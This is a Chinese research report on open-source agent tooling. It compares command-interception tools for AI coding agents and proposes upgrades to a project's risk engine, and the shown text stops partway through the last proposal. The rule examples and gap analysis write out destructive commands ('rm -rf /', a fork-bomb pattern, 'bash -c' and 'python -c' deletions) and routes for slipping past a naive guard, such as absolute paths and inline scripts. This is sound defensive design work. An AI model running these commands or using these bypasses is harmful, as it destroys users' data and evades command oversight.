# 运维 Agent 开源项目调研报告

> **位置**：`d:\ai\linux教学一体\tdsf-terminal-agent-clone\docs\reports\ops-agent-opensource-research.md`
> **目的**：为 TDSF Terminal Agent 的运维 agent 集成提供开源参考方案
> **调研日期**：2026-07-30
> **调研方法**：WebSearch 识别候选 + git clone 全量源码分析（用户硬约束，不凭 README 判断）
> **上游基线**：[crynta/terax-ai v0.8.6](https://github.com/crynta/terax-ai)

---

## 一、执行摘要

本报告调研了 6 个最有价值的运维/Agent 开源项目，全部按用户硬约束 git clone 到 `opensource-reference/` 目录进行全量源码分析。核心结论：

1. **命令拦截方向最具落地价值**：`destructive_command_guard`（dcg）和 `shellfirm` 都是 Rust 实现的高性能命令拦截器，与 TDSF 的 Rust 后端完美契合，可直接升级 TDSF 现有的 `src/lib/risk-engine/rules.ts`。
2. **TDSF 现有 RiskEngine 存在明显短板**：规则用 TypeScript 正则写死在源码里（16 条规则），而 dcg/shellfirm 已用 YAML 外置 100+ 规则、多级 Severity、模块化 pack 系统。
3. **Agent 框架方向 TDSF 已是最佳实践**：TDSF sidecar 已用 LangGraph 构建 PAOR 监督循环，无需更换；aider 的 `run_one` 主循环可作参考但非必需。
4. **Continue.dev 已停止维护**（README 明确声明 read-only），不建议集成。
5. **OpenHands (agent-canvas) 实为前端项目**，真正的 agent runtime 在 `software-agent-sdk` 仓库，本次 clone 的仓库参考价值有限。

**推荐集成方案**：分三阶段升级 TDSF 命令拦截层（短期 YAML 规则外置 → 中期多级 evaluator 架构 → 长期 MCP 工具暴露），详见第六章。

---

## 二、调研方法论

### 2.1 候选项目识别

按用户要求，通过 WebSearch 调研四个方向：

| 方向 | 调研关键词 | 候选项目 |
|------|-----------|----------|
| 通用 AI coding agent | `ai coding agent open source 2026` | Aider、OpenHands、Continue.dev、Cursor、Cline |
| 运维/SRE 专用 agent | `sre agent kubernetes opensource` | kagent、agent-sandbox、k8sgpt |
| Agent 框架/库 | `agent framework langgraph autogen` | LangGraph、AutoGen、CrewAI、Pydantic AI |
| 命令拦截/风险评估 | `shell command guard rust intercept` | Shellfirm、destructive_command_guard、Firejail、Bubblewrap |

### 2.2 深度分析项目筛选

从候选中按"对 TDSF 运维 agent 集成价值最高"筛选 6 个项目做全量源码分析：

| 项目 | 筛选理由 |
|------|---------|
| Aider | Python AI pair programming 鼻祖，agent 主循环经典实现 |
| OpenHands | 业界知名 self-hosted agent，架构参考价值高 |
| LangGraph | TDSF sidecar 已在用，需确认是否为最佳实践 |
| Continue.dev | VS Code/JetBrains 编码 agent，工具调用机制参考 |
| Shellfirm | Rust 命令拦截器，与 TDSF Rust 后端契合 |
| destructive_command_guard | Rust 命令拦截器，pack 系统最成熟 |

### 2.3 全量源码克隆

按用户硬约束，所有项目 git clone 到 `opensource-reference/` 目录：

| 项目 | clone 命令 | 状态 | 备注 |
|------|-----------|------|------|
| [Aider](https://github.com/Aider-AI/aider) | `git clone --depth 30 https://gh-proxy.com/https://github.com/Aider-AI/aider.git` | 成功 | 直连超时，用 [gh-proxy.com](https://gh-proxy.com/) 镜像 |
| [OpenHands](https://github.com/OpenHands/agent-canvas) | 已存在 | 成功 | 实为 agent-canvas 前端，非完整 runtime |
| [LangGraph](https://github.com/langchain-ai/langgraph) | 已存在 | 成功 | monorepo，含 9 个子库 |
| [destructive_command_guard](https://github.com/Dicklesworthstone/destructive_command_guard) | 已存在 | 成功 | Rust 项目，50+ pack |
| [Shellfirm](https://github.com/kaplanelad/shellfirm) | `git clone --depth 30 https://gh-proxy.com/https://github.com/kaplanelad/shellfirm` | 成功 | Rust 项目，100+ 规则 |
| [Continue.dev](https://github.com/continuedev/continue) | `git clone --depth 30 https://gh-proxy.com/https://github.com/continuedev/continue opensource-reference/continue-dev` | 成功 | 直连失败，用镜像；目录名加 `-dev` 避免与空目录冲突 |

**clone 失败项目**：无（所有 6 个项目均成功克隆）。GitHub 直连超时问题通过 [gh-proxy.com](https://gh-proxy.com/) 镜像解决。

---

## 三、候选项目总览矩阵

| 项目 | 语言 | Stars | License | 维护状态 | 与 TDSF 契合度 | 核心价值 |
|------|------|-------|---------|----------|---------------|----------|
| [Aider](https://github.com/Aider-AI/aider) | Python | 高 | Apache-2.0 | 活跃 | 中 | Agent 主循环参考 |
| [OpenHands (agent-canvas)](https://github.com/OpenHands/agent-canvas) | TS/React | 高 | MIT | 活跃 | 低 | 前端架构参考（非 runtime） |
| [LangGraph](https://github.com/langchain-ai/langgraph) | Python | 高 | MIT | 活跃 | 高（已用） | TDSF 已集成，确认最佳实践 |
| [Continue.dev](https://github.com/continuedev/continue) | TS | 中 | Apache-2.0 | **已停止维护** | 低 | 不建议集成 |
| [Shellfirm](https://github.com/kaplanelad/shellfirm) | Rust | 中 | MIT | 活跃 | 高 | 命令拦截规则参考 |
| [destructive_command_guard](https://github.com/Dicklesworthstone/destructive_command_guard) | Rust | 中 | custom | 活跃 | 高 | 命令拦截架构参考 |

---

## 四、深度源码分析

### 4.1 Aider — AI Pair Programming 终端 Agent

**仓库**：[Aider-AI/aider](https://github.com/Aider-AI/aider) · **语言**：Python · **License**：Apache-2.0

#### 4.1.1 项目定位

Aider 是终端内 AI pair programming 工具，让 LLM 直接在本地 git 仓库中编辑代码。支持 Claude 3.7、DeepSeek R1、GPT-4o 等主流模型，也支持本地模型。

#### 4.1.2 核心架构

**Agent 主循环**（`aider/coders/base_coder.py:876`）：

```python
def run(self, with_message=None, preproc=True):
    try:
        if with_message:
            self.io.user_input(with_message)
            self.run_one(with_message, preproc)
            return self.partial_response_content
        while True:
            try:
                if not self.io.placeholder:
                    self.copy_context()
                user_message = self.get_input()
                self.run_one(user_message, preproc)
                self.show_undo_hint()
            except KeyboardInterrupt:
                self.keyboard_interrupt()
    except EOFError:
        return
```

**关键设计**：
- `run()` 是无限循环：`get_input() → run_one() → show_undo_hint()`
- `run_one()` 处理单轮：发送 LLM → 解析编辑 → 应用 diff → 自动 lint/test → git commit
- 支持多种 edit_format：`whole`、`diff`、`udiff`、`search-replace`、`patch`
- 内置 RepoMap（tree-sitter 生成代码地图）让 LLM 理解大型代码库

**LLM 集成**（`aider/llm.py`）：基于 [litellm](https://github.com/BerriAI/litellm) 统一接口，支持 100+ provider。

#### 4.1.3 对 TDSF 的参考价值

| 价值点 | 说明 | 采纳建议 |
|--------|------|---------|
| `run_one()` 单轮循环 | 清晰的"发送→解析→应用→验证"流程 | TDSF sidecar 的 PAOR 循环已更先进，仅作概念参考 |
| RepoMap 代码地图 | tree-sitter 生成代码结构摘要 | 可参考用于 TDSF 的 explore agent，提升大代码库理解 |
| edit_format 多格式 | 支持 whole/diff/udiff/patch | TDSF coding agent 可借鉴，提升代码编辑鲁棒性 |
| 自动 lint/test | 每次编辑后自动验证 | TDSF 已有五绿门禁，可强化为 agent 自动触发 |

**结论**：Aider 的主循环设计经典但简单，TDSF 的 LangGraph PAOR 循环已是更先进的工业级实现。RepoMap 和 edit_format 有参考价值，但非优先集成项。

---

### 4.2 OpenHands (Agent Canvas) — Self-hosted Agent 前端

**仓库**：[OpenHands/agent-canvas](https://github.com/OpenHands/agent-canvas) · **语言**：TypeScript/React · **License**：MIT

#### 4.2.1 重要发现

本次 clone 的 `openhands/` 目录实际是 [agent-canvas](https://github.com/OpenHands/agent-canvas) 仓库，**不是完整的 OpenHands runtime**。根据 `docs/architecture.md`：

> Agent Canvas is a React and TypeScript frontend for running and monitoring OpenHands agents across local, remote, and hosted environments. It is adapted from the OpenHands frontend to talk directly to the OpenHands Agent Server and related automation services.

真正的 agent runtime 在 [OpenHands/software-agent-sdk](https://github.com/OpenHands/software-agent-sdk) 仓库的 `openhands-agent-server/` 目录。

#### 4.2.2 架构分析

**系统边界**（`docs/architecture.md`）：
- Agent Canvas 负责：UI 渲染、前端状态、API 调用转换
- Agent Canvas **不负责**：执行 agent 动作、沙箱隔离、托管 LLM 凭据、运行定时任务

**运行时服务**：
- 主后端：[OpenHands Agent Server](https://github.com/OpenHands/software-agent-sdk)（REST API）
- 可选：ingress 服务、Automation Server、OpenHands Cloud

**前端模块**：
- `src/api/`：Agent Server 适配器
- `src/components/`：路由和功能 UI
- `src/hooks/`：React Query 和状态 hooks
- `src/stores/`：Zustand 状态存储

#### 4.2.3 对 TDSF 的参考价值

| 价值点 | 说明 | 采纳建议 |
|--------|------|---------|
| Agent Server 分离架构 | 前端/agent runtime 分离 | TDSF 已是 Tauri+sidecar 分离架构，无需参考 |
| ACP (Agent-Client Protocol) | 支持 Claude Code/Codex/Gemini 等 | 概念先进，但 TDSF 是单机教学工具，不需要多 agent 后端 |
| Docker sandbox 模式 | agent 运行在 Docker 隔离环境 | TDSF 是本地终端 IDE，无需 Docker 隔离 |

**结论**：agent-canvas 是大型分布式 agent 平台的前端，架构过于重型，与 TDSF 的单机教学定位不符。真正的 OpenHands runtime 未 clone，如需深入参考需另 clone `software-agent-sdk` 仓库。

---

### 4.3 LangGraph — 状态化 Agent 编排框架

**仓库**：[langchain-ai/langgraph](https://github.com/langchain-ai/langgraph) · **语言**：Python · **License**：MIT

#### 4.3.1 项目定位

LangGraph 是低层级编排框架，用于构建长期运行、有状态的 agent。灵感来自 [Pregel](https://research.google/pubs/pub37252/) 和 [Apache Beam](https://beam.apache.org/)。

#### 4.3.2 仓库结构（monorepo）

根据 `AGENTS.md`，仓库含 9 个子库：

| 子库 | 用途 |
|------|------|
| `checkpoint` | checkpointer 基础接口 |
| `checkpoint-postgres` | Postgres checkpoint 实现 |
| `checkpoint-sqlite` | SQLite checkpoint 实现 |
| `cli` | 官方 CLI |
| `langgraph` | 核心框架（StateGraph） |
| `prebuilt` | 高级 API（create_react_agent） |
| `sdk-js` | JS/TS SDK |
| `sdk-py` | Python SDK |

**依赖关系**：
```text
checkpoint
├── checkpoint-postgres
├── checkpoint-sqlite
├── prebuilt
└── langgraph

prebuilt
└── langgraph
```

#### 4.3.3 React Agent 实现

`libs/prebuilt/langgraph/prebuilt/chat_agent_executor.py` 实现了 `create_react_agent`，核心状态：

```python
class AgentState(TypedDict):
    messages: Annotated[Sequence[BaseMessage], add_messages]
    remaining_steps: NotRequired[RemainingSteps]
```

**关键设计**：
- `messages` 用 `add_messages` reducer 自动累加
- `remaining_steps` 防止无限循环（默认 25）
- 支持 `pre_model_hook` / `post_model_hook` 在 LLM 调用前后插入逻辑
- 支持 `state_schema` 自定义状态结构
- 支持 `checkpointer` 持久化中间状态

#### 4.3.4 对 TDSF 的参考价值

**TDSF 已集成 LangGraph**（见 `src-tauri/sidecar/graph/graph.py`），构建了 PAOR 监督循环：

```python
def build_agent_graph():
    builder = StateGraph(AgentState)
    builder.add_node("supervisor", supervisor_node)
    builder.add_node("plan", plan_node)
    builder.add_node("act", act_node)
    builder.add_node("observe", observe_node)
    builder.add_node("reflect", reflect_node)
    builder.add_node("tool_call", tool_call_node)
    builder.add_node("permission_check", permission_check_node)
    # 8 条边，4 条条件边
    return builder.compile()
```

| 价值点 | 说明 | 采纳建议 |
|--------|------|---------|
| `remaining_steps` 防无限循环 | TDSF 已有 `max_iterations` | 已采纳 |
| `checkpointer` 状态持久化 | 支持中断恢复 | TDSF 可增加，用于会话恢复 |
| `pre_model_hook` | LLM 调用前插入权限检查 | TDSF 已用 `permission_check` 节点实现，更完善 |
| `interrupt()` 人工干预 | 暂停图执行等待用户输入 | TDSF 已用 `needs_permission` 状态实现 |

**结论**：TDSF 对 LangGraph 的使用已是最佳实践，PAOR 7 节点图比标准 React Agent 更适合运维场景。建议增加 `checkpointer` 实现会话恢复（SQLite 即可），这是当前唯一缺失的能力。

---

### 4.4 Continue.dev — 编码 Agent（已停止维护）

**仓库**：[continuedev/continue](https://github.com/continuedev/continue) · **语言**：TypeScript · **License**：Apache-2.0

#### 4.4.1 重要发现

README 明确声明：

> **Note: The `continuedev/continue` repository is no longer actively maintained and is read-only for all users.**

Continue.dev 已发布最终 2.0.0 版本后停止维护。不建议作为活跃集成参考。

#### 4.4.2 架构分析

尽管已停止维护，其架构仍有参考价值：

**核心模块**（`core/`）：
- `llm/llms/`：支持 50+ LLM provider（Anthropic、OpenAI、Gemini、Ollama 等）
- `edit/lazy/`：代码编辑（`applyCodeBlock`、`deterministic`、`streamDiff`）
- `indexing/`：代码索引（CodebaseIndexer、LanceDbIndex 向量检索）
- `autocomplete/`：自动补全
- `tools/`：工具调用框架
- `protocol/`：IDE 通信协议

#### 4.4.3 对 TDSF 的参考价值

| 价值点 | 说明 | 采纳建议 |
|--------|------|---------|
| 多 LLM provider 抽象 | 50+ provider 统一接口 | TDSF 用 Vercel `ai` v7，已有类似能力 |
| LanceDbIndex 向量检索 | 代码语义搜索 | 可参考用于 TDSF explore agent |
| streamDiff 流式 diff | 增量代码编辑 | TDSF coding agent 可借鉴 |

**结论**：Continue.dev 已停止维护，不建议集成。其多 provider 抽象和向量检索设计可作概念参考，但 TDSF 已有等效能力。

---

### 4.5 Shellfirm — 命令拦截器（Rust）

**仓库**：[kaplanelad/shellfirm](https://github.com/kaplanelad/shellfirm) · **语言**：Rust · **License**：MIT

#### 4.5.1 项目定位

> **Think before you execute.** Humans make mistakes. AI agents make them faster. shellfirm intercepts dangerous shell commands before the damage is done.

Shellfirm 是 shell hook 工具，在命令执行前拦截危险命令，要求用户解决挑战（如算术题）才放行。

#### 4.5.2 核心架构

**模块结构**（`shellfirm/src/lib.rs`）：

```rust
pub mod agent;        // AI agent 检测
pub mod audit;        // 审计日志
pub mod blast_radius; // 影响范围检测
pub mod checks;       // 规则匹配引擎
pub mod config;       // 配置管理
pub mod context;      // 运行时上下文（SSH/root/分支）
pub mod env;          // 环境检测
pub mod llm;          // LLM 集成（feature gate）
pub mod mcp;          // MCP server（feature gate）
pub mod policy;       // 策略合并
pub mod prompt;       // 挑战提示
pub mod tui;          // TUI 配置界面
pub mod wrap;         // 命令包装
```

**Severity 分级**（`shellfirm/src/checks.rs:30`）：

```rust
pub enum Severity {
    Info,
    Low,
    #[default]
    Medium,
    High,
    Critical,
}
```

**Check 结构**（`shellfirm/src/checks.rs:78`）：

```rust
pub struct Check {
    pub id: String,
    #[serde(with = "serde_regex")]
    pub test: Regex,
    pub description: String,
    pub from: String,           // 规则组（git/fs/k8s 等）
    pub challenge: Challenge,   // 挑战类型
    pub filters: Vec<Filter>,   // 后置过滤器
    pub alternative: Option<String>,        // 安全替代命令
    pub alternative_info: Option<String>,   // 替代说明
    pub severity: Severity,
}
```

**规则数据外置**（YAML）：规则按生态分 22 个文件（`shellfirm/checks/*.yaml`）：
- `git.yaml`、`fs.yaml`、`kubernetes.yaml`、`docker.yaml`
- `aws.yaml`、`azure.yaml`、`gcp.yaml`、`terraform.yaml`
- `database.yaml`（mysql/psql/mongodb/redis）、`network.yaml`
- `shell.yaml`、`base.yaml`、`github.yaml`、`heroku.yaml`
- `flyio.yaml`、`netlify.yaml`、`vercel.yaml`、`npm.yaml`

**git.yaml 规则示例**：

```yaml
- from: git
  test: git\s{1,}reset
  description: "This command going to reset all your local changes."
  id: git:reset
  severity: High
  filters:
    - type: NotContains
      value: "--soft"
  alternative: "git stash"
  alternative_info: "Saves your changes to the stash so you can recover them later with 'git stash pop'."
```

#### 4.5.3 关键特性

| 特性 | 说明 |
|------|------|
| 100+ 规则 | 覆盖 9 个生态（filesystem/git/k8s/terraform/docker/aws/gcp/azure/heroku） |
| 8 shell 支持 | Zsh/Bash/Fish/Nushell/PowerShell/Elvish/Xonsh/Oils |
| 上下文感知 | SSH 连接/root 用户/受保护分支/生产集群时升级挑战难度 |
| 安全替代建议 | 每条规则可配 `alternative` + `alternative_info` |
| 项目策略 | `.shellfirm.yaml` 团队共享规则（只增不减） |
| 审计日志 | JSON-lines 格式记录每次拦截 |
| 影响范围检测 | 运行时上下文信号喂入风险评分 |
| MCP server | 暴露为 Claude Code/Cursor 等 AI 工具 |

**MCP 工具**（README）：

| 工具 | 说明 |
|------|------|
| `check_command` | 检查命令风险，返回 severity/规则/替代方案 |
| `suggest_alternative` | 获取更安全的替代命令 |
| `explain_risk` | 详细解释为何危险 |
| `get_policy` | 读取活跃配置和项目策略 |

#### 4.5.4 对 TDSF 的参考价值

**TDSF 现有 RiskEngine 对比**（`src/lib/risk-engine/rules.ts`）：

| 维度 | TDSF 现状 | Shellfirm | 差距 |
|------|----------|-----------|------|
| 语言 | TypeScript 正则 | Rust + YAML 数据 | TDSF 规则与代码耦合 |
| 规则数 | 16 条 | 100+ 条 | TDSF 覆盖不足 |
| 分级 | 5 级（deny/high/medium/low/safe） | 5 级（Critical/High/Medium/Low/Info） | 等价 |
| 规则外置 | 否（写死 TS） | 是（YAML 文件） | TDSF 维护困难 |
| 安全替代 | 否 | 是（`alternative` 字段） | TDSF 体验差 |
| 上下文感知 | 否 | 是（SSH/root/分支） | TDSF 无智能升级 |
| 审计日志 | `requiresAuditLog` 标记 | JSON-lines 实现 | TDSF 未实现日志 |
| MCP 暴露 | 否 | 是 | TDSF 未暴露给 AI |

**结论**：Shellfirm 的 YAML 规则格式、安全替代建议、上下文感知升级三项特性对 TDSF 价值最高。建议将 TDSF 的 TS 正则迁移到 YAML，并增加 `alternative` 字段。

---

### 4.6 Destructive Command Guard (dcg) — 命令拦截器（Rust）

**仓库**：[Dicklesworthstone/destructive_command_guard](https://github.com/Dicklesworthstone/destructive_command_guard) · **语言**：Rust · **License**：custom

#### 4.6.1 项目定位

> A high-performance hook for AI coding agents that blocks destructive commands before they execute, protecting your work from accidental deletion across Claude Code, Codex CLI, Gemini CLI, Copilot CLI, VS Code Copilot Chat, Cursor, Hermes Agent, Grok (xAI), and related tools.

dcg 是专为 AI coding agent 设计的高性能命令拦截 hook，支持 Claude Code、Codex CLI、Gemini CLI 等 10+ agent。

#### 4.6.2 核心架构

**Evaluator 7 步流水线**（`src/evaluator.rs:8`）：

```rust
//! The evaluator performs the following steps in order:
//!
//! 1. Config block overrides - Explicit block patterns deny before allow patterns
//! 2. Config allow overrides - Explicit allow patterns permit non-blocked commands
//! 3. Heredoc/inline scripts - Extract + AST-scan embedded code with bounded fallback
//! 4. Quick rejection - Skip pack evaluation if no relevant keywords present
//! 5. Context sanitization - Mask known-safe string arguments (reduce false positives)
//! 6. Command normalization - Strip absolute paths from git/rm binaries
//! 7. Pack registry - Check enabled packs (safe patterns first, then destructive)
```

**Hook 协议处理**（`src/hook.rs:22`）：

```rust
pub struct HookInput {
    pub event: Option<String>,
    pub hook_event_name: Option<String>,
    pub tool_name: Option<String>,
    pub tool_input: Option<ToolInput>,
    pub tool_args: Option<serde_json::Value>,
    pub turn_id: Option<String>,      // Codex CLI 标识
    pub tool_call: Option<ToolCall>,   // Antigravity CLI 格式
}
```

支持多 agent 协议：Claude Code（`PreToolUse`）、Codex CLI（`turn_id`）、Gemini（`BeforeTool`）、Copilot、Cursor、Hermes、Grok、Antigravity（`toolCall` 嵌套）。

**Pack 系统模块化**（`src/packs/`）：50+ pack 按生态组织：

| 类别 | Pack |
|------|------|
| core | `core.filesystem`、`core.git`（默认开启，不可禁用） |
| system | `system.disk`、`system.permissions`、`system.services` |
| database | `postgresql`、`mysql`、`mongodb`、`redis`、`sqlite`、`snowflake`、`supabase` |
| cloud | `aws`、`azure`、`gcp` |
| containers | `docker`、`podman`、`compose` |
| kubernetes | `kubectl`、`helm`、`kustomize` |
| infrastructure | `terraform`、`pulumi`、`ansible`、`atmos` |
| loadbalancer | `nginx`、`haproxy`、`traefik`、`elb` |
| monitoring | `datadog`、`prometheus`、`newrelic`、`pagerduty`、`splunk` |
| secrets | `vault`、`aws_secrets`、`doppler`、`onepassword` |
| storage | `s3`、`gcs`、`azure_blob`、`minio` |
| windows | `filesystem`、`system`、`powershell`、`misc` |
| remote | `ssh`、`scp`、`rsync` |
| 其他 | `dns`、`email`、`payment`、`cicd`、`cdn`、`messaging`、`search`、`featureflags`、`platform`、`backup`、`safe`、`strict_git` |

#### 4.6.3 关键特性

| 特性 | 说明 |
|------|------|
| 50+ 安全 pack | 按生态模块化组织 |
| 亚毫秒级延迟 | SIMD 加速过滤（memchr + aho-corasick） |
| Heredoc/内联脚本扫描 | 捕获 `python -c "os.remove(...)"` 等嵌入代码 |
| AST 模式匹配 | `ast-grep` 解析嵌入代码结构 |
| 智能上下文检测 | 不拦截 `grep "rm -rf"`（数据），只拦截 `rm -rf /`（执行） |
| Agent 特定配置 | 信任级别（advisory label）+ pack 启用/禁用 |
| Bounded Failure Policy | 分析超时变显式审查/拦截，永不静默放行 |
| Allow-once 短代码 | 24 小时临时放行（HMAC 签名） |
| 分层 Allowlist | 项目/用户/系统三级 |
| Scan 模式 | CI 集成，扫描代码库中的危险模式 |
| SARIF 输出 | 标准化扫描结果格式 |
| MCP server | 暴露为 AI 工具 |
| 审计历史 | SQLite 存储（rusqlite） |
| 自更新 | GitHub Releases 自动更新 |

**JSON 输出协议**（deny 示例）：

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "deny",
    "permissionDecisionReason": "BLOCKED by dcg\n\nReason: git reset --hard destroys uncommitted changes\n\nRule: core.git:reset-hard\n\nCommand: git reset --hard HEAD~5",
    "ruleId": "core.git:reset-hard",
    "packId": "core.git",
    "severity": "critical",
    "confidence": 0.95,
    "allowOnceCode": "a1b2c3",
    "allowOnceFullHash": "sha256:abc123...",
    "remediation": {
      "safeAlternative": "git stash",
      "explanation": "Use git stash to save your changes first.",
      "allowOnceCommand": "dcg allow-once a1b2c3"
    }
  }
}
```

#### 4.6.4 对 TDSF 的参考价值

**dcg vs TDSF RiskEngine 详细对比**：

| 维度 | TDSF 现状 | dcg | 差距 |
|------|----------|-----|------|
| 架构 | 单层正则匹配 | 7 步流水线 | TDSF 无 heredoc/AST/上下文 |
| Heredoc 扫描 | 无 | 有（ast-grep） | TDSF 可被 `python -c "rm -rf /"` 绕过 |
| 上下文净化 | 无 | 有（掩码安全参数） | TDSF 误报率高 |
| 命令标准化 | 无 | 有（剥离路径前缀） | TDSF 可被 `/usr/bin/rm` 绕过 |
| Pack 模块化 | 无 | 有（50+ pack） | TDSF 规则不可扩展 |
| Bounded Failure | 无 | 有（超时永不静默放行） | TDSF 有安全风险 |
| 置信度评分 | 无 | 有（0.0-1.0） | TDSF 二元判断 |
| Allow-once | 无 | 有（HMAC 签名短代码） | TDSF 无临时放行机制 |
| 分层 Allowlist | 无 | 有（项目/用户/系统） | TDSF 无白名单 |
| 审计历史 | 标记未实现 | SQLite 实现 | TDSF 无历史查询 |
| MCP 暴露 | 无 | 有 | TDSF AI 无法主动查询风险 |

**结论**：dcg 的 7 步 evaluator 架构、heredoc 扫描、bounded failure policy 三项对 TDSF 价值最高。dcg 是本次调研中架构最成熟的项目，强烈建议深度参考。

---

## 五、横向对比矩阵

### 5.1 命令拦截能力对比

| 能力 | TDSF | Shellfirm | dcg | 差距评估 |
|------|------|-----------|-----|---------|
| 规则数 | 16 | 100+ | 50+ pack（数百规则） | 严重不足 |
| 规则外置 | 否（TS 写死） | 是（YAML） | 是（TOML + Rust pack） | 需迁移 |
| 分级数 | 5 | 5 | 5+（含 confidence） | 基本持平 |
| 安全替代 | 否 | 是 | 是 | 需增加 |
| 上下文感知 | 否 | 是（SSH/root/分支） | 是（agent 检测） | 需增加 |
| Heredoc 扫描 | 否 | 否 | 是（ast-grep） | 安全漏洞 |
| 命令标准化 | 否 | 否 | 是（路径剥离） | 安全漏洞 |
| Bounded Failure | 否 | 否 | 是 | 安全风险 |
| 置信度评分 | 否 | 否 | 是 | 体验不足 |
| Allow-once | 否 | 否 | 是（HMAC） | 体验不足 |
| 分层白名单 | 否 | 是（项目策略） | 是（三级） | 体验不足 |
| 审计日志 | 标记未实现 | JSON-lines | SQLite | 未实现 |
| MCP 暴露 | 否 | 是 | 是 | AI 无法主动查询 |
| 多 agent 协议 | 否 | 否 | 是（10+ agent） | N/A（TDSF 单机） |
| 性能 | TS 正则 | Rust SIMD | Rust SIMD | TDSF 可接受 |

### 5.2 Agent 框架能力对比

| 能力 | TDSF sidecar | LangGraph prebuilt | Aider | OpenHands |
|------|-------------|-------------------|-------|-----------|
| 主循环 | PAOR 7 节点图 | React Agent | run_one 循环 | Agent Server |
| 状态管理 | LangGraph StateGraph | TypedDict + reducer | 实例属性 | REST API |
| 防无限循环 | max_iterations | remaining_steps | 无 | N/A |
| 权限检查 | permission_check 节点 | pre_model_hook | 无 | N/A |
| 状态持久化 | 无 | checkpointer | 无 | Server 端 |
| 子 Agent 路由 | 8 子 Agent | 无（单 agent） | 无 | 多 agent |
| LLM 集成 | Vercel ai v7 | litellm | litellm | 自有 |
| 流式响应 | stream_agent | astream | yield_stream | SSE |

**结论**：TDSF 的 PAOR 7 节点图是本次对比中**最先进的 agent 主循环设计**，比 LangGraph 标准 React Agent 更适合运维场景（含权限检查节点）。唯一缺失是 `checkpointer` 状态持久化。

---

## 六、TDSF 集成方案

### 6.1 集成优先级矩阵

| 方案 | 价值 | 工作量 | 风险 | 优先级 |
|------|------|--------|------|--------|
| A. 规则 YAML 外置 | 高 | 中（3-5 天） | 低 | P0 |
| B. 安全替代建议 | 中 | 低（1-2 天） | 低 | P0 |
| C. Heredoc 扫描 | 高（安全） | 高（5-7 天） | 中 | P1 |
| D. 命令标准化 | 高（安全） | 中（2-3 天） | 低 | P1 |
| E. Bounded Failure | 高（安全） | 低（1-2 天） | 低 | P1 |
| F. 分层白名单 | 中 | 中（3-4 天） | 低 | P2 |
| G. 审计日志实现 | 中 | 中（2-3 天） | 低 | P2 |
| H. MCP 暴露 | 中 | 中（3-5 天） | 中 | P2 |
| I. LangGraph checkpointer | 中 | 中（2-3 天） | 低 | P2 |
| J. 上下文感知升级 | 中 | 高（4-6 天） | 中 | P3 |

### 6.2 阶段一（P0，短期 1-2 周）

#### 方案 A：规则 YAML 外置

**目标**：将 `src/lib/risk-engine/rules.ts` 的 16 条 TS 正则迁移到 YAML 文件。

**参考**：Shellfirm 的 `shellfirm/checks/*.yaml` 格式。

**设计**：

新建 `src/lib/risk-engine/rules/` 目录，按生态组织：

```yaml
# src/lib/risk-engine/rules/core.yaml
- id: core:fork_bomb
  severity: deny
  description: "Fork 炸弹（耗尽系统进程）"
  patterns:
    - ':[ \t]*\([ \t]*\)[ \t]*\{[ \t]*:[ \t]*\|[ \t]*:[ \t]*&[ \t]*\}[ \t]*;'
  requires_confirmation: false
  requires_audit_log: true
  irreversible: true

- id: core:rm_rf_root
  severity: deny
  description: "rm -rf / 或 /*（擦除系统）"
  patterns:
    - '\brm\s+(?:-[\w]*[rR][\w]*\s+)*-[\w]*[fF][\w]*\s+\/(?:\s|$|\*)'
  requires_confirmation: false
  requires_audit_log: true
  irreversible: true
```

```yaml
# src/lib/risk-engine/rules/operations.yaml
- id: ops:systemctl_modify
  severity: medium
  description: "修改 systemd 服务"
  patterns:
    - '\bsystemctl\s+(start|stop|restart|reload|enable|disable|mask|unmask)\b'
  requires_confirmation: false
  requires_audit_log: true
  irreversible: false
  alternative: "先 systemctl status 查看状态"
```

**实现工作量**：
- 规则迁移：1 天（16 条规则 + 参考 shellfirm 补充到 50+ 条）
- YAML 加载器：1 天（运行时加载 + 缓存）
- 规则热重载：1 天（开发模式监听文件变化）
- 测试更新：1-2 天（保持 830 测试全过）

#### 方案 B：安全替代建议

**目标**：为每条规则增加 `alternative` 和 `alternative_info` 字段，在拦截时展示给用户。

**参考**：Shellfirm 的 `alternative` / `alternative_info` 字段，dcg 的 `remediation.safeAlternative`。

**实现工作量**：
- 字段添加：0.5 天（YAML schema 扩展）
- UI 展示：1 天（RiskEngine 返回值 + 前端 tooltip）
- 规则填充：0.5 天（为现有规则补全替代建议）

### 6.3 阶段二（P1，中期 2-3 周）

#### 方案 C：Heredoc/内联脚本扫描

**目标**：检测 `python -c "os.remove('/')" `、`bash -c "rm -rf /"` 等嵌入危险代码。

**参考**：dcg 的 `src/heredoc.rs` + `src/ast_matcher.rs`（ast-grep）。

**风险**：TDSF 是 TypeScript 前端，无法直接用 Rust 的 ast-grep。可选方案：
- 方案 1：用 [tree-sitter](https://tree-sitter.github.io/) 的 WASM 版本（已有 `vendor/tree-sitter.wasm`）
- 方案 2：简化为正则提取 `python -c "..."` 内容后递归调用 RiskEngine

**推荐方案 2**（简化版），工作量 5-7 天。

#### 方案 D：命令标准化

**目标**：剥离命令路径前缀，防止 `/usr/bin/rm -rf /` 绕过规则。

**参考**：dcg 的 `src/normalize.rs`（`PATH_NORMALIZER`、`QUOTED_PATH_NORMALIZER`）。

**实现工作量**：2-3 天（TS 实现 token 解析 + 路径剥离）。

#### 方案 E：Bounded Failure Policy

**目标**：规则匹配超时时永不静默放行，改为显式拦截或要求人工确认。

**参考**：dcg 的 `src/perf.rs`（`Deadline` 结构，200ms 超时）。

**实现工作量**：1-2 天（RiskEngine 增加 timeout 包装 + 超时降级策略）。

### 6.4 阶段三（P2/P3，长期 4+ 周）

#### 方案 F：分层白名单

**参考**：dcg 的三级 allowlist（项目 `.dcg/allowlist.toml`、用户 `~/.config/dcg/`、系统 `/etc/dcg/`）。

**实现工作量**：3-4 天。

#### 方案 G：审计日志实现

**参考**：Shellfirm 的 JSON-lines 审计日志，dcg 的 SQLite 历史（`src/history/sqlite.rs`）。

**实现工作量**：2-3 天（TDSF 已有 `requiresAuditLog` 标记，只需实现日志写入）。

#### 方案 H：MCP 暴露

**目标**：将 RiskEngine 暴露为 MCP 工具，让 AI agent 主动查询命令风险。

**参考**：Shellfirm 的 `mcp` 模块（`check_command`/`suggest_alternative`/`explain_risk`/`get_policy` 四个工具），dcg 的 `src/mcp.rs`。

**实现工作量**：3-5 天（MCP server 注册 + 四个工具实现 + TDSF agent 调用）。

#### 方案 I：LangGraph checkpointer

**目标**：实现会话状态持久化，支持中断恢复。

